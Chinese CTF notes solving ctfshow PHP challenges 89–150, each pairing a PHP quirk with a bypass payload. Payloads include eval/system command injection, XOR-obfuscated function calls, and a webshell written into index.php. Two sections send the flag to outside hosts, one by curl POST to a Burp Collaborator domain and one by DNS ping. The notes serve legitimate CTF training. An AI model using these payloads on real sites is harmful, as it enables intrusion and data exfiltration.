[toc]

# 89,97 数组绕过

89:/?num[]=1

97:a[]=1&b[]=2

# 90 intval()特性

/?num=+4476

# 91 %0a绕过

[Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展](https://blog.csdn.net/qq_46091464/article/details/108278486)

payload：/?cmd=abc%0aphp

i区分大小写，m匹配多行

/^php$/im：m匹配多行，第二行匹配到php，放过

/^php$/i：首行没有匹配到php，绕过

# 92 科学计数法绕过

/?num=4476e123

# 93,95 8进制转10进制绕过

/?num=010574

010574为8进制，转10进制后为4476

# 94 小数点绕过

/?num=4476.0

# 101 直接绕过

```
?v1=1&v2=echo new Reflectionclass&v3=;
```

# 102,103 

> call_user_func(v1,v2) 
>
> v1:回调函数
>
> V2:回到函数的参数

> file_put_contents(v1, v2)
>
> v1:保存文件的地址，可以用伪协议
>
> v2:保存的内容

> hex2bin — 转换十六进制字符串为二进制字符串

payload

Get:

v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php

Post:

v1=hex2bin

# 104 sha1 mds5

sha1相同

```
    sha1('aaroZmOk')  
    sha1('aaK1STfY')
    sha1('aaO8zKZF')
    sha1('aa3OFF9m')
```

md5不能处理数组

所以：md5(a[]) === md5(b[])

# 105 php变量覆盖

php的变量覆盖 payload： GET: ?suces=flag POST: error=suces

# 106 parse_str()方法

> parse_str() 函数把查询字符串解析到变量中。

```
<?php
parse_str("name=Peter&age=43");
echo $name."<br>";
echo $age;
?>
```

payload

Get:?v3=240610708

POST: v1=flag=0

# 108 erge方法 %00正则截断

> `ereg()`函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回`true`，否则返回`false`。搜索对于字母字符是区分大小写的。ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配
>
> php解释器是C语言编写的
> C语言中学过[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)的结尾会有00作为字符串结束的标志
> 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束
>
> 0x00，%00，/00之类的截断，都是一样的
>
> strrev() 函数反转字符串。

payload：?c=a%00778

# 109 Refection类 Exception类

ReflectionClass、ReflectionMethod

```php
$class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类
$fuc=$class->newInstance();//实例化 fuc 类
$fuc->hello();
```

Exception

异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果（如果存在返回）只要是变量后面紧跟着（），那么对这个变量进行函数调用。例如\$a = 'phpinfo'; $a(）即调用phpinfo（）

Payload：

?v1=Exception&v2=system('cat fl36dg.txt') 

最后组装的语句为：

```php
eval("echo new Exception(system('cat fl36dg.txt')());");
system('cat fl36dg.txt')() -> 就是对system('cat fl36dg.txt')的调用
```

# 110 FilesystemIterator类 getcwd()函数

```
FilesystemIterator 获取指定目录下的所有文件
getcwd()函数 获取当前工作目录 返回当前工作目录
```

payload: ?v1=FilesystemIterator&v2=getcwd

得到文件名后

在url中访问文件

# 111 GLOBALS域 var_dump变量输出

**var_dump()** 函数用于输出变量的相关信息

GLOBALS为全局域引用

Payload:? v1=ctfshow&v2=GLOBALS

# 112 伪协议

> is_file() 函数检查指定的文件是否是常规的文件。

```php
payload:
php://filter/resource=flag.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
compress.zlib://flag.php
```

# 113 zlib伪协议 超长路径绕过

```
函数所能处理的长度限制进行目录溢出
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
```

```
compress.zlib://flag.php
```

# 114 is_numeric term %0c

> %0c -> \f -> 换页符 -> 将当前位置移到下页开头
>
> is_numeric()函数用于检测变量是否为数字或数字字符串。
>
> trim() 函数移除字符串两侧的空白字符或其他预定义字符。

# 123 isset()

**isset()** 函数用于检测变量是否已设置并且非 NULL

payload : CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag

> ==PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将`空格 + . [`转换为`_`
> 但是有一个特性可以绕过,使变量名出现`.`之类的
> 特殊字符`[`, GET或POST方式传参时,变量名中的`[`也会被替换为`_`,但其后的字符就不会被替换了==
> 如 `CTF[SHOW.COM`=>`CTF_SHOW.COM`

# 125 get_defined_vars() var_export()

> **get_defined_vars()** 函数返回由所有已定义变量所组成的数组。
>
> **var_export()** 函数用于输出或返回一个变量，以字符串形式表示

Payload：CTF_SHOW=1&CTF[SHOW.COM=1&fun=var_export(get_defined_vars())

# 126 get请求+号处理 _SERVER[‘argv’]

> 用 get 方法 , 参数里有 “+” 时，到后台会被转义成空格
>
> assert() ，参数如果为字符串，会被当做php代码来执行
>
> $\_SERVER 是 [PHP](http://c.biancheng.net/php/) 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。
>
> $_SERVER['argv']
>
>  这时候的\$_SERVER\[‘argv’\]\[0\] = \$_SERVER[‘QUERY_STRING’]：
>
> ?a=b+c=d
>
> argv=>[a=b,c=d]
>
> Argv[0]=a=b
>
> Pars_str(argv[0])=> $a = b

payload

```
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])
```

# 127 extract()

> extract() 函数从数组中将变量导入到当前的符号表。数组解构：

```php
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a; \$b = $b; \$c = $c";
?>
```

Payload：?ctf show=ilove36d

空格自动转为下划线

# 128 \_()=gettext()

> _()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll
>
> gettext() : 在当前域中查找属性，gettext(“abc”) -> 返回abc
>
> get_defined_vars() -> 获取所有定义的变量组装成数组返回

Payload: ?f1=_&f2=get_defined_vars

# 129 目录穿越

> stripos():查找 "php" 在字符串中第一次出现的位置

# 131 正则限制绕过

[深悉正则(pcre)最大回溯/递归限制](https://www.laruence.com/2010/06/08/1579.html)

对于如下的正则:

```
/<script>.*?<\/script>/is
```

当要匹配的字符串长度**大于**100014的时候, 就**不会**得出正确结果:

```
$reg = "/<script>.*?<\/script>/is";$str = "<script>********</script>"; //长度大于100014$ret = preg_replace($reg, "", $str); //返回NULL
```

难道正则对匹配的串有长度限制?
不是, 当然不是, 原因是这样的, 在PHP的pcre扩展中, 提供了俩个设置项.

```
1. pcre.backtrack_limit //最大回溯数2. pcre.recursion_limit //最大嵌套数
```

默认的backtarck_limit是100000(10万).
这个问题, 就和设置项backtrack_limit有关系. 现在要弄清这个问题的原因, 关键就是什么是"回溯".
这个正则, 使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配.
举个例子:

```
源字符串: aaab正则:     .*?b
```

匹配过程开始的时候, ".\*?"首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符"b", "b"在源字符串位置1匹配失败("a"), 于是回溯, 将匹配控制交回给".\*?", 这个时候, ".*?"匹配一个字符"a", 并再次将控制权交给"b", 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯.
现在我们来看看文章开头的例子, 默认的backtrack_limit是100000, 而源字符串的开头是9个字符, 一共是99997个字符.
另外, 因为match函数自身的逻辑, 在文章开头的例子下, 会导致回溯计数增3(有兴趣的可以参看pcrelib/pcre_exec.c中match函数逻辑部分), 所以在匹配到""之前, pcre中的回溯计数刚好是100000,于是就正常匹配, 退出.
而, 只要在增加一个字符, 就会导致回溯计数大于100000, 从而导致匹配失败退出.
在PHP 5.2以后, 提供了:

```
int preg_last_error ( void )Returns the error code of the last PCRE regex execution.
```

我们应该经常检查这个函数的返回值, 当不为零的时候说明上一个正则函数出错, 特别的对于文章的例子, 出错返回(PREG_BACKTRACK_LIMIT_ERROR)
最后, 在顺便说一句, 非贪婪模式导致太多回溯, 必然会有一些性能问题, 适当的该写下正则, 是可以避免这个问题的. 比如将文章开头例子中的正则修改为:

```
/<script>[^<]*<\/script>/is
```

就不会导致这么多的回溯了~
而recursion_limit限制了最大的正则嵌套层数, 如果这个值, 设置的太大, 可能会造成耗尽栈空间爆栈. 默认的100000似乎有点太大了...
就比如对于一个长度为10000的字符串, 如下这个看似"简"的单正则:

```
//默认recursion_limit为100000$reg = /(.+?)+/is;$str = str_pad("laruence", 10000, "a"); //长度为1万$ret = preg_repalce($reg, "", $str);
```

会导致core, 这是因为嵌套太多, 导致爆栈.
当然, 你可以通过修改栈的大小来暂时的解决这个问题, 比如修改栈空间为20M以后, 上面的代码就能正常运行, 但这肯定不是最完美的解法. 根本之道, 还是优化正则.
最后: **正则虽易, 用好却难.**. 尤其在做大数据量的文本处理的时候, 如果正则设计不慎, 很容易导致深度嵌套, 另外考虑到性能, 还是建议能用字符串处理尽量使用字符串处理代替.

> str_repeat() 函数把字符串重复指定的次数。
>
> 把字符串 "." 重复 13 次：
>
> <?php
> echo str_repeat(".",13);
> ?>

payload

```python
import requests


url="http://17e66580-d7b0-4cf7-a5c7-635cc75c05a4.challenge.ctf.show/"

data={
	'f':'kradress'*130000+'36Dctfshow'
}

res=requests.post(url,data=data)

print(res.text)
```

# 132 || &&

语义和java的||&&一样

payload:?username=admin&password=2&code=admin

# 133 [\`\$F`的骚操作](https://blog.csdn.net/qq_46091464/article/details/109095382)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}

```

> 我们传递?F=\`$F\`;+sleep 3好像网站确实sleep了一会说明的确执行了命令
> **那为什么会这样？**
> 因为是我们传递的\`\$F\`;+sleep 3。先进行substr()函数截断然后去执行eval()函数
> 这个函数的作用是执行php代码，\`\`是shell_exec()函数的缩写，然后就去命令执行。
> 而\$F就是我们输入的\`\$\F\`;+sleep 3 使用最后执行的代码应该是
> \`\`\$F\`;+sleep 3`,就执行成功
> 这里可能有点绕，慢慢理解

> ?F=\`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net

# 134 extract($_POST)

php变量覆盖 利用点是 extract(\$\_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表

# 135 133加强版

```php
`$F`;+ping `cat flag.php|awk 'NR==2'`.dm3sbjacb5im4zj0lpipkcus8je92y.oastify.com
#通过ping命令去带出数据，然后awk NR一排一排的获得数据
```

> AWK， 数据过滤工具 (类似于grep，比grep强大)，属数据处理引擎，基于模式匹配检查输入文本，逐行处理并输出。通常用在Shell脚本中，获取指定的数据，单独使用时，可对文本数据做统计
>
> **格式**
>
> 格式1：前置命令 | awk [选项] ‘条件{编辑指令}’

# 137 call_user_func()

[call_user_func()](https://www.php.net/manual/zh/function.call-user-func.php)

类静态方法的调用

```
ctfshow=ctfshow::getFlag
```

# 138 call_user_func()数组参数

```
POST: ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```

# 139 bash盲注

python脚本

140 

# 140 intval 弱类型比较

> 正则表示必须要以数字字母开头结尾，我们可以找一些可以无参的函数
>
> intval是 弱类型 比较 会把非数字字符转化为0

# 141异或绕过

> 数字和运算符是可以一起执行命令的，如`1+phpinfo()+1;`是可以显示phpinfo页面的，GET传入的只是字符串“1+phpinfo()+1”;是不能直接执行命令的，经过eval处理后就变成了可以执行命令，`if(preg_match('/^\W+$/', $v3)){`的存在我们只能传入非数字字母，不过php7可以用`（‘phpinfo’)()`动态调用函数，可以用异或绕过

异或脚本：

```php
<?php
highlight_file(__FILE__);
$a = $_GET['a'];
for ($i = 0; $i < strlen($a); $i++) {
    echo "%".dechex(ord($a[$i])^0xff);
}
echo "^";
for ($i = 0; $i < strlen($a); $i++) {
    echo "%ff";
}
payload: ?v1=1&v2=1&v3=%2b(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)%2b

1+system tac f*+1
```

143 同141

```
?v1=1&v2=1&v3=*(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)*
```

144 同 141

```
?v1=1&v2=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)&v3=-
```

# 142 0与0x0

0的16进制是0x0

# 145 三目运算符 取反

```
eval("return 1?phpinfo():1;");
```

```
v1=1&v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&v2=1
```

# 146 加强或

```
?v1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|
```

# 147 函数绝对路径

> php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法

```php
if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }
}
```

 思路还算是比较清晰，正则很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用

紧接着就到了如何只控制第二个参数来执行命令的问题了，后来找到可以用`create_function`来完成，`create_function`的第一个参数是参数，第二个参数是内容。

函数结构形似

```
create_function('$a,$b','return 111')

==>

function a($a, $b){
    return 111;
}
```

然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。

```
create_function('$a,$b','return 111;}phpinfo();//')

==>

function a($a, $b){
    return 111;}phpinfo();//
}
```

这样一来，我们想要执行的代码就会执行

payload

```
GET ?show=;};system('grep flag flag.php');/*
POSOT ctf=%5ccreate_function
```

# 148 异或

payload

```
code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%02"^"%7d%60%60%21%60%28");
```

预期解：

```
code=$哈="`{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*
```

# 149 scandir unlink

> scandir()：列出参数目录内所有的文件
>
> unlink(): 删除文件

文件覆盖

payload

```
ctf=index.php
show=<?php eval($_POST[1]);?>
```

# 150 NGINX日志，文件包含

```
get /?isVIP=1
post ctf=/var/log/nginx/access.log&1=system('tac f*');
```

